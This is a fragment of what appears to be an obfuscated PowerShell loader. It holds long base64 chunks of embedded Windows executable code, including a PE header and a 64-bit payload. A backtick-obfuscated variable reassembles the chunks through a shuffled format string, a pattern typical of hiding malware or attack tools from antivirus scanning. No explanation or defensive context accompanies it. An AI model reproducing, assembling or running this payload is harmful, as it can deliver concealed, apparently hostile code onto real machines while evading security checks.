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','wfeaJdayL84lFtID5Kw+EDP///4D5LQ+EA////4D5Q34VgPlFD47u/v//gOlkgPkBD4bi/v//SukJAQAAM8CA6TBAiUWkgPkJD4cC////agTpL/7//41C/olFsI1BzzwIdwdqCekb/v//D77Bg+grdCJISHQQg+gDD4XS/v//agjpFv7//2oHg8n/WIlNlOnS/f//agfpAf7//zPAQIlFnOsDigpCgPkwdPiA6TGA+QgPh4sAAADrqo1BzzwIdqOA+TDrtDldIHQijUL/iUWwD77Bg+g','EQChgAAAg2ARAMGAAAFDYBEBoYAAAgNgEQOxgAADg2ARABHAAASDYBEAkcAABUNgEQChwAAGA2ARAaHAAAbDYBEDscAACENgEQASAAAJQ2ARAJIAAAoDYBEAogAACsNgEQOyAAALg2ARABJAAAyDYBEAkkAADUNgEQCiQAAOA2ARA7JAAA7DYBEAEoAAD8NgEQCSgAAAg3ARAK','EA+mYBABRnAQAwZwEATmcBAHZnAQCKZwEAlmcBAKRnAQCyZwEAvGcBANBnAQDoZwEAAGgBABZoAQAoaAEAOmgBAERoAQBQaAEAXGgBAGpoAQB6aAEAimgBAJxoAQCwaAEAxmgBAAAAAAD4YwEA1mMBAMBjAQAAAAAAAAAAAAAQABAQEAAQIBAAEAAAAAAAAAAA9CkAEBw9ABAMhgAQMJUAEAAAAAAAAAAAL9IAEO/0ABCjlQAQAAAAAAAAAAAAAAAAAAAAAOTo+1IAAAAAAgAAAG4AAADoVwEA6EUBAAAAAADk6PtSAAAAAAwAAAAUAAAAWFgBAFhGAQBhZGRyZXNzIG5vdCBhdmFpbGFibGUAAABhbHJlYWR5IGNvbm5lY3RlZAAAAGFyZ3VtZW50IGxpc3QgdG9vIGxvbmcAAGFyZ3VtZW50IG91dCBvZiBkb21haW4AAGJhZCBhZGRyZXNzAGJhZCBmaWxlIGRlc2NyaXB0b3IAYmFkIG1lc3NhZ2UAYnJva2VuIHBpcGUAY29ubmVjdGlvbiBhYm9ydGVkAABjb25uZWN0aW9uIGFscmVhZHkgaW4gcHJvZ3Jlc3MAAGNvbm5lY3Rpb24gcmVmdXNlZAAAY29ubmVjdGlvbiByZXNldAAAAABkZXN0aW5hdGlvbiBhZGRyZXNzIHJlcXVpcmVkAAAAAGV4ZWN1dGFibGUgZm9ybWF0IGVycm9yAGZpbGUgdG9vIGxhcmdlAABob3N0IHVucmVhY2hhYmxlAAAAAGlkZW50aWZpZXIgcmVtb3ZlZAAAaWxsZWdhbCBieXRlIHNlcXVlbmNlAAAAaW5hcHByb3ByaWF0ZSBpbyBjb250cm9sIG9wZXJhdGlvbgAAaW52YWxpZCBzZWVrAAAAAGlzIGEgZGlyZWN0b3J5AABtZXNzYWdlIHNpemUAAAAAbmV0d29yayBkb3duAAAAAG5ldHdvcmsgcmVzZXQAAABuZXR3b3JrIHVucmVhY2hhYmxlAG5vIGJ1ZmZlciBzcGFjZQBubyBjaGlsZCBwcm9jZXNzAAAAAG5vIGxpbmsAbm8gbWVzc2FnZSBhdmFpbGFibGUAAA','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LRkA7Bch+ARB0B1Dolnj//1mLRkQ7Bcx+ARB0B1DohHj//1mLRkg7BdB+ARB0B1Docnj//1mLRkw7BdR+ARB0B1DoYHj//1leXcNVi+xWi3UIhfZ0WYsGOwWIfgEQdAdQ6EF4//9Zi0YEOwWMfgEQdAdQ6C94//9Zi0YIOwWQfgEQdAdQ6B14//9Zi0YwOwW4fgEQdAdQ6At4//9Zi0Y0OwW8fgEQdAdQ6Pl3//9ZXl3DVYvsVot1CIX2D4RuAwAA/3YE6N53////dgjo1nf///92DOjOd////3YQ6MZ3////dhTovnf///92GOi2d////zbor3f///92IOind////3Yk6J93////dijol3f///92LOiPd////3Yw6Id3////djTof3f///92HOh3d////3Y46G93////djzoZ3f//4PEQP92QOhcd////3ZE6FR3////dkjoTHf///92TOhEd////3ZQ6Dx3////dlToNHf///92WOgsd////3Zc6CR3////dmDoHHf///92ZOgUd////3Zo6Ax3////dmzoBHf///92cOj8dv///3Z06PR2////dnjo7Hb///92fOjkdv//g8RA/7aAAAAA6NZ2////toQAAADoy3b///+2iAAAAOjAdv///7aMAAAA6LV2////tpAAAADoqnb///+2lAAAAOifdv///7aYAAAA6JR2////tpwAAADoiXb///+2oAAAAOh+dv///7akAAAA6HN2////tqgAAADoaHb///+2uAAAAOhddv///7a8AAAA6FJ2////tsAAAADoR3b///+2xAAAAOg8dv///7bIAAAA6DF2//+DxED/tswAAADoI3b///+2tAAAAOgYdv///7bUAAAA6A12////ttgAAADoAnb///+23AAAAOj3df///7bgAAAA6Ox1////tuQAAADo4XX///+26AAAAOjWdf///7bQAAAA6Mt1////tuwAAADowHX///+28AAAAOi1df///7b0AAAA6Kp1////tvgAAADon3X///+2/AAAAOiUdf///7YAAQAA6Il1////tgQBAADofnX//4PEQP+2CAEAAOhwdf///7YMAQAA6GV1////thABAADoWnX///+2FAEAAOhPdf///7YYAQAA6ER1////thwBAADoOXX///+2IAEAAOgudf///7YkAQAA6CN1///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')
        ${LogON`6`4BiT_baS`e`64} = ("{96}{91}{29}{108}{23}{46}{102}{41}{82}{58}{94}{89}{12}{13}{24}{64}{34}{71}{25}{35}{27}{31}{32}{76}{42}{28}{48}{103}{99}{85}{84}{9}{47}{75}{86}{8}{50}{43}{78}{92}{65}{100}{37}{97}{22}{73}{93}{112}{14}{101}{57}{79}{0}{81}{15}{98}{52}{4}{49}{95}{20}{6}{51}{88}{107}{105}{80}{33}{74}{62}{39}{10}{11}{66}{18}{38}{111}{104}{59}{56}{67}{21}{44}{77}{45}{54}{72}{26}{63}{7}{60}{55}{69}{109}{53}{70}{2}{17}{68}{3}{106}{83}{1}{16}{40}{110}{87}{90}{61}{30}{5}{19}{36}"-f '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','AAAAAAA','gJAAAAAAAAAAAAAAAAAAAAAAAANwkAAAAAAAAkJwBAAAAAAAAAAAAAAAAAAAAAAADAAAAsJwBAOCbAQC4mwEAAAAAAAAAAAAAAAAAAAAAAAAAAACAyAEAAAAAAP////8AAAAAGAAAAKgkAAAAAAAAAAAAAAAAAA','3VwRnVuY3Rpb25FbnRyeQAAugRSdGxVbndpbmRFeABqA0lzRGVidWdnZXJQcmVzZW50AHADSXN','zMxmZg8fhAAAAAAASCvRSYP4CHIi9sEHdBRmkIoBOgQKdSxI/8FJ/8j2wQd17k